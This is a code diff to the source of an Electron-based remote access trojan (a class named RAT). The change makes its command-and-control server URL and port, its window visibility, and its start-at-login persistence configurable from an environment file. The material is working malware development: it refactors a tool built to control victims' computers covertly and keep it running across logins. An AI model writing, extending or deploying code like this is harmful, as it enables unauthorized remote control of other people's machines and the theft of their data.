@@ -9,8 +9,8 @@ const fs = require('fs');
 
 
 class RAT {
-  constructor(server_url, show_window=false, enable_autoload=true) {
-    this.server_url = server_url;
+  constructor(configuration) {
+    this.server_url = `${configuration.server_url}:${configuration.server_port}`;
 
     this.window = null;
     this.user_id = null;
@@ -25,11 +25,11 @@ class RAT {
       'send_ping': () => this.sendPingRequest(),
     }
 
-    if (show_window) this.createWindow();
-    
-    if (enable_autoload) {
+    if (configuration.show_window) this.createWindow();
+
+    if (configuration.enable_autoload) {
       app.setLoginItemSettings({
-        openAtLogin: true    
+        openAtLogin: true
       })
     };
 
@@ -214,9 +214,18 @@ write-host "$($sb.tostring())"
 
 // Start the app
 app.whenReady().then(() => {
-  let rat = new RAT(
-    server_url='127.0.0.1:8000',
-    show_window=true,
-    enable_autoload=false,
-  );
+  let conf = {};
+  const f_data = fs.readFileSync('enviroment', 'utf8');
+  f_data.split('\n').filter(line => {
+    return !line.startsWith('#');
+  }).forEach(line => {
+    const [key, value] = line.trim().split('=');
+    if (['true', 'false'].indexOf(value.toLocaleLowerCase()) > -1) {
+      conf[key] = value === 'true';
+    } else {
+      conf[key] = value;
+    };
+  });
+
+  let rat = new RAT(conf);
 });
